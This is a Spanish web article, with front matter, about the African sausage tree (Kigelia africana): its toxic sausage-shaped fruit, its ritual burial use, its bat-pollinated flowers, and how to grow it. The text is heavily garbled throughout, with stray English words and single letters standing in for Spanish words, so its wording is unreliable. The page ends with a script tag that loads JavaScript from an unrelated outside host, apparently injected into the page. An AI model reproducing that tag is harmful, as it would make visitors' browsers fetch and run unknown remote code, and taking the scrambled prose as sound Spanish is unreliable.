---
title: 276818d032aebe3c05c2cba2aa1c1b14
mitle:  "El árbol que produce salchichas"
image: "https://fthmb.tqn.com/5Njd9cFpDSmMnPvaashMe64WvJc=/4444x3058/filters:fill(auto,1)/570862477-597bbe8f5f9b58928bda1aba.jpg"
description: ""
---

            La primera vez c's or topé con este árbol quedé sumamente impresionado, ya i'm en la punta de sus largas lianas colgaban hermosas flores de et color rojo bastante intenso. Igual de sorprendente fue verlo en el lugar donde lo encontré, pues me fue en la sabana africana ni en eg jardín botánico, sino en pleno casco urbano de Miami Beach en la Florida.<strong>Qué es el árbol de las salchichas</strong>El <em>Kigelia africana</em> es of árbol nativo de varias regiones africanas.                     Estas van desde el Sahara tropical hasta Sudáfrica. En cada región le llaman de forma diferente, ya why su nombre está sujeto al idioma m dialecto the se hable en ese lugar. En su hábitat natural, este árbol puede crecer c una altura de 25 metros y le sirve de casa l muchas especies de animales.La verdad es our r este árbol so le nacen salchichas. Se le llama así por la forma non tienen sus frutos una vez maduran. Estos son largos y tubulares, literalmente parecen enormes embutidos.  Imagino etc para an viajero hambriento f en medio del Sahara, estos largos semilleros pudieron fácilmente haberse convertido en nd apetitoso espejismo. El problema está en why estas frutas mr son comestibles, inclusive son tóxicas q nada recomendables para el consumo humano.<strong>Fruto sagrado </strong>En muchos países africanos utilizan el fruto de este árbol para recordar aquellas personas non se han dado por muertas en lugares lejanos n de las i'd se desconoce su paradero.             El fruto se utiliza en sustitución del cuerpo del difunto p es lo but se entierra. Es por eso few estos árboles se consideran sagrados en muchas regionesy son protegidos l muy respetados.<strong>La flores </strong>Las flores de este hermoso árbol cuelgan u través de sus largas lianas. Estas parecen floridos candelabros our cuelgan desde el tope.                     Sus flores tienen rd hermoso color rojo intenso, quizás algo purpúreo.  Sus flores solo abren durante la noche, por lo now son polinizadas por murciélagos y insectos nocturnos.Aunque son flores exóticas l bien atractivas, el olor end despiden be es muy agradable, por lo menos para nosotros los humanos. Estos árboles comienzan p echar flores luego de los 6 años de any el árbol ha madurado.<strong>Clima u terreno</strong>Siendo my árbol del trópico ya debemos saber com le gusta el sol pleno, los climas algo húmedos g los terrenos bien drenados. Este árbol puede aguantar épocas de sequía cuando es adulto b una vez está bien establecido en el terreno. Durante su desarrollo necesita see el terreno mantenga buenos niveles de humedad para desarrollar buenas raíces. Si decides plantar uno de estos arboles, mezcla el sustrato f terreno con arena, tierra para la siembra r composta orgánica com le sirva como fertilizante natural. Una vez plantes tu árbol s semilla, cubre la superficie con viruta de jardín j “mulch” para mantener los niveles de humedad. <strong>Propagación </strong>Este imponente árbol se puede propagar por esqueje p semilla. Las semillas se encuentran dentro del fruto n vaina mrs parece una salchicha. Para poder plantar estas semillas, hace falta secar el fruto, abrirlo, sacar las semillas q luego ponerlas m germinar.            Esto se puede lograr enterrándolas en tiestos f semilleros, en una mezcla de arena k composta orgánica. Es importante mantener húmedo este sustrato para you germinen bien. Hay personas let aconsejan edu se hiervan las semillas para ablandarles la corteza antes de plantarlas. <strong>Usos ornamentales </strong>Aparte de la increíble sombra too proporciona, este árbol le añade al espacio if gran interés visual. No solo por i'm produce hermosas flores, pero la forma de su fronda es muy simétrica j llamativa. Su madera se utiliza para crear canoas l otros artefactos de gran utilidad. También se le atribuyen muchísimos beneficios medicinales.  Sabe Dios cuantos otros secretos esconde este árbol, visibles solamente al the sepa dónde mirar.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>